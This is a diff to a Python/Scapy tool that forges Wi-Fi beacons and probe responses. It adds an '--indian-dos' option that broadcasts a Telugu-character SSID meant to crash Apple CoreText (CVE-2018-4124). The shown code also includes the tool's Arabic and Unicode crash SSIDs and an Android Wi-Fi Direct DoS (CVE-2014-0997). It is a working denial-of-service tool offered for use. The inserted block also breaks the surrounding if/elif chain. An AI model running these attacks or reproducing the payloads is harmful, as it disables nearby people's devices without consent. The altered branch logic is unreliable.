@@ -11,7 +11,9 @@
 
 """
     Version history:
-    1.5 - Added the "--unicode-dos" option for Apple notification messages DoS attacks 
+    1.6 - Added the "--indian-dos" option for Apple CoreText API DoS attacks
+          using Indian (telugu) character (CVE-2018-4124).
+    1.5 - Added the "--unicode-dos" option for Apple notification messages DoS attacks
           using unicode characters, from May 2015 (no CVE available).
     1.4 - Added the "--cve-2014-0997" option for Wi-Fi Direct DoS attacks against
           Android 4.x mobile devices (CVE-2014-0997).
@@ -22,7 +24,7 @@
           locally administered MAC addresses.
     1.2 - Changed (c) to Dino Security SL.
         - Added enhancements to the client monitoring capabilities replacing
-          the capture of Probe Request frames with Authentication and 
+          the capture of Probe Request frames with Authentication and
           Association Requests frames ("-m" or "--mac" option).
           Changed class from ProbeRequestMonitor() to FrameRequestMonitor().
           Probe Requests create lots of false positives when monitoring clients
@@ -30,7 +32,7 @@
           that disclose their PNL by default or with hidden networks :( (as
           the client will send Probe Requests periodically and not just when
           the right Wi-Fi network (SSID and security type) is on the air.
-    1.1 - Added the "--arabic-dos" option for Apple CoreText API DoS attacks 
+    1.1 - Added the "--arabic-dos" option for Apple CoreText API DoS attacks
           using arabic characters (no CVE available).
     1.0 - Original version.
 """
@@ -66,8 +68,8 @@ class FrameRequestMonitor:
     """
     Frame Request Monitor:
     Monitor Wi-Fi clients (MAC address(es)) asking for a specific SSID.
-    
-    Enhanced to replace Probe Requests by Authentication and Association 
+
+    Enhanced to replace Probe Requests by Authentication and Association
     Requests. Changed the original class name from ProbeRequestMonitor() to
     FrameRequestMonitor().
     """
@@ -85,14 +87,14 @@ class FrameRequestMonitor:
 
     # Is the 802.11 frame (pkt) an Authentication Request?
     #
-    # The same frame type (type = 0, subtype = 11) is used for both 
+    # The same frame type (type = 0, subtype = 11) is used for both
     # Authentication req & resp: wlan.fc.type_subtype eq 11
     #
-    # This trick is based on checking the Auth Request sequence number: 
+    # This trick is based on checking the Auth Request sequence number:
     # - the (1st) request uses seqnum "1" and the response uses "2"...
     #
     # Potentially we could check which frame is a response for a given request
-    # frame, but it would require processing them all: 
+    # frame, but it would require processing them all:
     # pkt-resp.answers(pkt-req), returns 1 if it is, 0 if it is not
     #
     def isauthenticationrequest(self, pkt):
@@ -104,14 +106,14 @@ class FrameRequestMonitor:
                     check = 1
         return check
 
-    # Record and print the client MAC address 
+    # Record and print the client MAC address
     def recordandprintclient(self, clientmac, frametype):
 
-        # When monitoring all clients, or a single client, 
+        # When monitoring all clients, or a single client,
         # print the client(s) MAC address(es) only once
         if (self.mac.lower() == "ff:ff:ff:ff:ff:ff".lower()) or \
-           (self.mac.lower() == clientmac.lower()): 
-            if (clientmac not in self.observedclients): 
+           (self.mac.lower() == clientmac.lower()):
+            if (clientmac not in self.observedclients):
                 # No multithreading sync before printing...
                 if self.verbose:
                     sys.stdout.write(" ["+clientmac+"] "+"("+\
@@ -129,7 +131,7 @@ class FrameRequestMonitor:
         #    frametype = "probe"
         if pkt.haslayer(Dot11AssoReq):
             frametype = "assoc"
-        elif self.isauthenticationrequest(pkt): 
+        elif self.isauthenticationrequest(pkt):
             frametype = "auth"
 
         # If 802.11 frame is an Association Request
@@ -145,7 +147,7 @@ class FrameRequestMonitor:
                 self.recordandprintclient(clientmac,frametype)
 
         # If 802.11 frame is an Authentication Request
-        elif self.isauthenticationrequest(pkt): 
+        elif self.isauthenticationrequest(pkt):
             # Extract BSSID from the Authentication Request, as there is
             # no SSID in this type of frame
             # (Scapy provides MAC addresses in lowercase)
@@ -201,6 +203,7 @@ loop = False
 cve_2012_2619 = False
 cve_2014_0997 = False
 arabic_dos = False
+indian_dos = False
 unicode_dos = False
 rates = "11g" # 11b, 11b -- TODO: 11n
 maxssidlen = 32
@@ -225,7 +228,7 @@ beacon_interval = int(beacon_interval_secs * 1000) # (ms) 100ms
 # - 12 secs aprox. (at least in iOS 6.1.2 - iPad 3)
 
 # Number of frames per network type while looping
-loop_count = 300 
+loop_count = 300
 # Time interval during each loop (default: 30 secs)
 loop_secs = loop_count * beacon_interval_secs
 
@@ -247,19 +250,19 @@ def __unfuckupSC__(sequence, fragment = 0):
 # Build beacon frames
 def buildBeacon():
 
-    # Channel to DSset: 
+    # Channel to DSset:
     # E.g. channel 3 is '\x03'
     dsset = chr(channel)
-    
+
     # Initial beacon timestamp
     ts = 00000000L
 
     # Privacy settings: beacon header
     if wep or wpa or wpa2 or wpa_enterprise or wpa2_enterprise or cve_2012_2619 or \
-       arabic_dos or unicode_dos:
+       arabic_dos or unicode_dos or indian_dos:
         beacon_header = Dot11Beacon(timestamp=ts, beacon_interval=beacon_interval,\
                     cap="short-preamble+short-slot+ESS+privacy")
-    else: # open 
+    else: # open
         beacon_header = Dot11Beacon(timestamp=ts, beacon_interval=beacon_interval,\
                     cap="short-preamble+short-slot+ESS")
 
@@ -290,12 +293,12 @@ def buildBeacon():
         Dot11Elt(ID="DSset",info=dsset)/\
         rates_header/\
         Dot11Elt(ID="TIM",info="\x00\x01\x00\x00")/\
-        Dot11Elt(ID=50,info="\x0c\x12\x18\x60") 
+        Dot11Elt(ID=50,info="\x0c\x12\x18\x60")
         # Extended supported rates (50): 6, 9, 12, 48
 
     # Privacy settings: extra RSN headers
     if wpa:
-        # WPA-Personal TKIP: 
+        # WPA-Personal TKIP:
         extra_privacy_header = Dot11Elt(ID=221, info="\x00\x50\xf2\x01\x01\x00"+
                 # OUI (Microsoft) + WPAv1
                 "\x00\x50\xf2\x02"+
@@ -305,7 +308,7 @@ def buildBeacon():
                 "\x01\x00"+"\x00\x50\xf2\x02")
                 # The last "\x02" means PSK auth
 
-        # WPA-Personal AES-CCMP: 
+        # WPA-Personal AES-CCMP:
         #extra_privacy_header = Dot11Elt(ID=221, info="\x00\x50\xf2\x01\x01\x00"+
                 # OUI (Microsoft) + WPAv1
         #       "\x00\x50\xf2\x04"+
@@ -397,6 +400,8 @@ def buildBeacon():
         beacon = beacon/extra_privacy_header
     elif arabic_dos:
         beacon = beacon
+    elif indian_dos:
+        beacon = beacon
     elif unicode_dos:
         beacon = beacon
     else:
@@ -421,10 +426,10 @@ def mac2str(mac):
 # Build probe response frames
 def buildProbeResponse():
 
-    # Channel to DSset: 
+    # Channel to DSset:
     # E.g. channel 3 is '\x03'
     dsset = chr(channel)
-    
+
     # Initial beacon timestamp
     ts = 00000000L
 
@@ -445,7 +450,7 @@ def buildProbeResponse():
         error("wrong rate type: {0} (11b or 11g)".format(rates))
 
     # Destination address for Probe Responses shouldn't be FF:...:FF but directed
-    
+
     probeResponse = RadioTap()/Dot11(addr1=dst,addr2=bssid,addr3=bssid)/\
         probresp_header/\
         Dot11Elt(ID="SSID",info=ssid)/\
@@ -467,9 +472,9 @@ def buildProbeResponse():
 # Switch the security settings (type) of the network
 def switchNetworkType(p):
     """
-    Looping through the different network types: 
+    Looping through the different network types:
     OPEN, WEP, WPA-Personal, WPA2-Personal, WPA-Enterprise, and WPA2-Enterprise
-    
+
     The parameter 'p' (boolean) indicates if the network type must be printed.
     """
 
@@ -485,7 +490,7 @@ def switchNetworkType(p):
     elif wep:
         # It's WEP, switch to WPA
         wep = False
-        wpa = True 
+        wpa = True
         if p:
             str = "wpa-psk"
     elif wpa:
@@ -493,7 +498,7 @@ def switchNetworkType(p):
         wpa = False
         wpa2 = True
         if p:
-            str = "wpa2-psk" 
+            str = "wpa2-psk"
     elif wpa2:
         # It's WPA2, switch to WPA-Enterprise
         wpa2 = False
@@ -541,13 +546,13 @@ def sendBeacons():
             sys.stdout.flush()
 
     beacon = buildBeacon()
-    
+
     try:
         while True:
 
             if loop:
                 if frames > loop_count:
-                    # Change to the next network type: 
+                    # Change to the next network type:
                     # OPEN, WEP, WPA(2)-Personal, WPA(2)-Enterprise
                     frames = 1
                     switchNetworkType(printnetworktype)
@@ -576,7 +581,7 @@ def sendBeacons():
             ##ts = struct.pack('Q', time.time())
             beacon.getlayer(Dot11Beacon).timestamp = ts
 
-            # sendp(): inter & loop can be used if frames do not change 
+            # sendp(): inter & loop can be used if frames do not change
             # (e.g. no change in sequence number)
             ##sendp(beacon, iface=interface, loop=1, inter=beacon_interval_secs)
             sendp(beacon, iface=interface, verbose=False)
@@ -595,14 +600,14 @@ def sendBeacons():
 def sendProbeResponses():
 
     probeResponse = buildProbeResponse()
-    
+
     try:
         while True:
             if verbose:
                 sys.stdout.write(".")
                 sys.stdout.flush()
 
-            # sendp(): inter & loop can be used if frames do not change 
+            # sendp(): inter & loop can be used if frames do not change
             # (e.g. no change in sequence number)
             sendp(probeResponse, iface=interface, loop=1, inter=beacon_interval_secs)
             #sendp(probeResponse, iface=interface, verbose=False)
@@ -616,7 +621,7 @@ def sendProbeResponses():
             error("wrong local interface name: {0}".format(interface))
         else:
             raise
-            
+
 # Print monitor details
 def printMonitor():
     if mac.lower() == "ff:ff:ff:ff:ff:ff":
@@ -646,6 +651,8 @@ def printAP():
         privacy = "CVE-2012-2619"
     elif arabic_dos:
         privacy = "Arabic DoS"
+    elif indian_dos:
+        privacy = "Indian DoS"
     elif unicode_dos:
         privacy = "Unicode DoS"
     else:
@@ -669,7 +676,7 @@ def printProbeResponse():
     print("Probe Response: {0}, Source: {1}, Channel: {2}".\
         format(ssid,bssid,channel))
     print("Destination (target): {0}".format(dst))
-    
+
 # Stop AP if interrupted (Ctrl+C)
 def signal_handler(signal, frame):
     # Stop the monitoring process...
@@ -687,7 +694,7 @@ def error(msg):
 # Check if a MAC address has the right format
 def validMAC(mac):
     # Check if the argument is a valid MAC address
-    # If we would like to accept both ":" (Linux) and "-" (Windows) as 
+    # If we would like to accept both ":" (Linux) and "-" (Windows) as
     # MAC address byte separators... use this regex instead:
     # re.match("[0-9a-f]{2}([-:])[0-9a-f]{2}(\\1[0-9a-f]{2}){4}$", mac.lower())
     return re.match("([a-fA-F0-9]{2}[:|\-]?){6}$", mac.lower())
@@ -703,10 +710,10 @@ def RandUnicastMAC():
     i = 0
     count = 6
     while i < count:
-        # If the least significant bit (LSB) of the first byte is one (odd number), 
+        # If the least significant bit (LSB) of the first byte is one (odd number),
         # it is a multicast MAC address (we want a unicast MAC address)
         multicast_hex = ['1', '3', '5', '7', '9', 'b', 'd', 'f']
-        # If the second least significant bit (LSB) of the first byte is one, 
+        # If the second least significant bit (LSB) of the first byte is one,
         # it is a locally administered MAC address (we want a universal MAC address)
         localadmin_hex = ['2', '6', 'a', 'e']
         octet = hex(random.randint(0, 255))
@@ -778,6 +785,9 @@ if __name__ == "__main__":
     group_privacy.add_argument("--arabic-dos", action='store_true',\
                 help="Arabic characters DoS in Apple CoreText (default = off)")
                 # arabic_dos
+    group_privacy.add_argument("--indian-dos", action='store_true',\
+                help="Indian (Telugu) character DoS in Apple CoreText (default = off)")
+                # indian_dos
     group_privacy.add_argument("--unicode-dos", action='store_true',\
                 help="Unicode characters DoS in Apple notifications (default = off)")
                 # unicode_dos
@@ -787,7 +797,7 @@ if __name__ == "__main__":
                 "\n- Use the --interval option to specify the Probe Response frequency"+
                 "\n- Use the --dst option to specify the Probe Response destination address")
                 # cve_2014_0997
-    
+
     args = parser.parse_args()
 
     if args.interface != None:
@@ -795,16 +805,19 @@ if __name__ == "__main__":
     else:
         parser.print_help()
         error("it is mandatory to specify the local interface name.")
-    
+
     if args.arabic_dos != None:
         arabic_dos = args.arabic_dos
 
+    if args.indian_dos != None:
+        indian_dos = args.indian_dos
+
     if args.unicode_dos != None:
         unicode_dos = args.unicode_dos
-        
+
     if args.verbose != None:
         verbose = args.verbose
-        
+
     if args.non_bcast != None:
         non_bcast = args.non_bcast
 
@@ -821,7 +834,11 @@ if __name__ == "__main__":
         #ssid = u'سمَـَّوُوُحخ ̷̴̐خ ̷̴̐خ ̷̴̐خ امارتيخ ̷̴̐خ'
         # 31 bytes
         ssid='سمَـَّوُوُحخ ̷̴̐'
-    
+
+    # Indiam (Telugu) DoS SSID
+    if args.indian_dos:
+        ssid = 'జ్ఞ‌ా';
+
     # Unicode DoS SSID
     elif args.unicode_dos:
         #ssid = u'effective. \nPower\nلُلُصّبُلُلصّبُررً ॣ ॣh ॣ ॣ\n 冗'
@@ -884,7 +901,7 @@ if __name__ == "__main__":
 
     if args.interval != None:
         beacon_interval = int(args.interval)
-        beacon_interval_secs = beacon_interval/float(1000)  
+        beacon_interval_secs = beacon_interval/float(1000)
 
     if args.loop_interval != None:
         if loop:
@@ -900,7 +917,7 @@ if __name__ == "__main__":
     except os.error as e:
         parser.print_help()
         error("wrong local interface name: {0}".format(interface))
-    
+
     # Capture CTRL+C interruptions...
     signal.signal(signal.SIGINT, signal_handler)
 
@@ -922,10 +939,10 @@ if __name__ == "__main__":
 
         # Wi-Fi Direct SSID in Android 4.x: "DIRECT-"
         ssid = "DIRECT-"
-        
+
         # Print Probe Response details
         printProbeResponse()
-    
+
         # Start sending probe responses...
         sendProbeResponses()
     else:
